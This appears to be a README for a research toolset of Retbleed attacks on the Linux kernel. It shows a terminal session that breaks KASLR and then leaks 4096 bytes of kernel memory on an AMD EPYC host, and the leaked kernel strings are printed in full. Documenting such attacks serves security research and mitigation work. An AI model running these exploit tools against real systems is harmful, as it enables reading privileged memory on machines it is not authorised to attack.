# Retbleed Exploits
We provide a toolset of attacks against the Linux kernel using *Retbleed* 

```
kwikner@ee-tik-cn102:~/check/exploits$ uname -r
5.8.0-63-generic
kwikner@ee-tik-cn102:~/check/exploits$ grep -m1 model\ name /proc/cpuinfo 
model name	: AMD EPYC 7252 8-Core Processor
kwikner@ee-tik-cn102:~/check/exploits$ time ./break_kaslr 
[*] ffffffffa1c00000 (2400)

real	0m0.023s
user	0m0.004s
sys	0m0.019s
kwikner@ee-tik-cn102:~/check/exploits$ ./do_retbleed.sh ffffffffa1c00000 2 leak_perf
Using Core 6 and 14
[-] Sweep over 65536 MiB of memory............
[*] reload buffer pa @ f7dc00000
[*] page_offset_base @ ffff8c4e40000000
[*] reload buffer kva @ ffff8c5dbdc00000
[-] Read ffffffffa2fa7269: 3Spectre V2 : retpoline,amd selected but CPU is not AMD. Switching to AUTO select[0a][00][00][00][00][00][01]6Spectre V2 : %s selected on command line.[0a][00][00][00][00][01]3Spectre V2 : Spectre mitigation: kernel not compiled with retpoline; no mitigation available![00][01]3Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline[0a][00][00][00][00][00][00][01]6Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch[0a][00][00][00][00][00][00][00][01]6Spectre V2 : Enabling Restricted Speculation for firmware calls[0a][00][00][00][00][00][00][01]6Spectre V2 : spectre_v2_user=%s forced on command line.[0a][00][00][00][00][00][00][01]3Spectre V2 : Unknown user space protection option (%s). Switching to AUTO select[0a][00][00][00][00][00][01]6Spectre V2 : mitigation: Enabling %s Indirect Branch Prediction Barrier[0a][00][00][00][00][00][00][01]6Speculative Store Bypass: %s[0a][00][01]4L1TF: System has more than MAX_PA/2 memory. L1TF mitigation not effective.[0a][00][00][00][01]6L1TF: You may make it effective by booting the kernel with mem=%llu parameter.[0a][00][00][00][00][00][00][00][01]6L1TF: However, doing so will make a part of your RAM unusable.[0a][00][00][00][00][00][00][00][01]6L1TF: Reading https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/l1tf.html might help you decide.[0a][00][00][00][00][01]3Spectre V2 : unknown option (%s). Switching to AUTO select[0a][00][00][00][01]3Spectre V2 : System may be vulnerable to spectre v2[0a][00][00][01]6Spectre V2 : Update user space SMT mitigation: STIBP %s[0a][00][00][00][00][00][00][01]4MDS CPU bug present and SMT on, data leak possible. See https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/mds.html for more details.[0a][00][00][00][00][00][00][00][00][01]4TAA CPU bug present and SMT on, data leak possible. See https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/tsx_async_abort.html for more details.[0a][00][00][00][00]Mitigation: Speculative Store Bypass disabled[00][00][00]Mitigation: Speculative Store Bypass disabled via prctl[00]Mitigation: Speculative Store Bypass disabled via prctl and seccomp[00][00][00][00][00]Mitigation: Full generic retpoline[00][00][00][00][00][00]Mitigation: Full AMD retpoline[00][00]User space: Mitigation: STIBP protection[00][00][00][00][00][00][00][00]User space: Mitigation: STIBP always-on protection[00][00][00][00][00][00]User space: Mitigation: STIBP via prctl[00]User space: Mitigation: STIBP via seccomp and prctl[00][00][00][00][00]Vulnerable: __user pointer sanitization and usercopy barriers only; no swapgs barriers[00][00]Mitigation: usercopy/swapgs barriers and __user pointer sanitization[00][00][00][00]Unknown: Dependent on hypervisor status[00]Vulnerable: Clear CPU buffers attempted, no microcode[00][00][00]arch/x86/kernel/cpu/cpuid-deps.c[00]umwait:online[00]umwait_control[00]max_time[00]enable_c02[00]stepping[09]: %d[0a][00]stepping[09]: unknown[0a][00]microcode[09]: 0x%x[0a][00]cpu MHz[09][09]: %u.%03u[0a][00]cache size[09]: %u KB[0a][00]physical id[09]: %d[0a][00]siblings[09]: %d[0a][00]core id[09][09]: %d[0a][00]cpu cores[09]: %d[0a][00]apicid[09][09]: %d[0a][00]initial apicid[09]: %d[0a][00]flags[09][09]:[00][0a]bugs[09][09]:[00][0a]vmx flags[09]:[00][0a]bogomips[09]: %lu.%02lu[0a][00]TLB size[09]: %d 4K pages[0a][00]clflush size[09]: %u[0a][00]cache_alignment[09]: %d[0a][00]power management:[00] [%d][00][00][00][00][00][00][00][00]processor[09]: %u[0a]vendor_id[09]: %s[0a]cpu family[09]: %d[0a]model[09][09]: %u[0a]model name[09]: %s[0a][00][00][00][00][00][00]fpu[09][09]: yes[0a]fpu_exception[09]: yes[0a]cpuid level[09]: %d[0a]wp[09][09]: yes[0a][00][00][00][00][00][00]address sizes[09]: %u bits physical, %u bits virtual[0a][00]vnmi[00]preemption_timer[00]posted_intr[00]invvpid[00]ept_x_only[00]ept_ad[00]ept_1gb[00]flexpriority[00]apicv[00]eptp_switching[00]tsc_offset[00]vtpr[00]mtf[00]vapic[00]unrestricted_guest[00]vapic_reg[00]shadow_vmcs[00]pml[00]ept_mode_based_exec[00]tsc_scaling[00]usr_wait_pause[00]f00f[00]fdiv[00]coma[00]tlb_mmatch[00]apic_c1e[00]11ap[00]fxsave_leak[00]clflush_monitor[00]sysret_ss_attrs[00]null_seg[00]swapgs_fence[00]amd_e400[00]cpu_meltdown[00]spectre_v1[00]spec_store_bypass[00]l1tf[00]mds[00]msbds_only[00]swapgs[00]taa[00]itlb_multihit[00]srbds[00]pae[00]cx8[00]sep[00]pge[00]cmov[00]pse36[00]pn[00]clflush[00]dts[00]fxsr[00]sse2[00]ia64[00]pbe[00]mmxext[00]fxsr_opt[00]pdpe1gb[00]rdtscp[00]3dnowext[00]3dnow[00]longrun[00]lrti[00]cxmmx[00]k6_mtrr[00]cyrix_arr[00]centaur_mcr[00]constant_tsc[00]arch_perfmon[00]pebs[00]rep_good[00]acc_power[00]nopl[00]xtopology[00]tsc_reliable[00]nonstop_tsc[00]extd_apicid[00]amd_dcm[00]aperfmperf[00]nonstop_tsc_s3[00]tsc_known_freq[00]pni[00]dtes64[00]ds_cpl[00]vmx[00]smx[00]tm2[00]ssse3[00]sdbg[00]cx16[00]xtpr[00]pdcm[00]dca[00]sse4_1[00]sse4_2[00]movbe[00]popcnt[00]tsc_deadline_timer[00]avx[00]f16c[00]rdrand[00]rng_en[00]ace_en[00]ace2[00]ace2_en[00]phe[00]phe_en[00]pmm[00]pmm_en[00]lahf_lm[00]cmp_legacy[00]svm[00]extapic[00]cr8_legacy[00]abm[00]sse4a[00]misalignsse[00]3dnowprefetch[00]osvw[00]xop[00]skinit[00]lwp[00]fma4[00]tce[00]nodeid_msr[00]tbm[00]topoext[00]perfctr_core[00]perfctr_nb[00]bpext[00]perfctr_llc[00]mwaitx[00]ring3mwait[00]cpuid_fault[00]cpb[00]epb[00]cat_l3[00]cat_l2[00]cdp_l3[00]invpcid_single[00]hw_pstate[00]proc_feedback
[*] Leaked 4096 bytes in 1.970 seconds
```
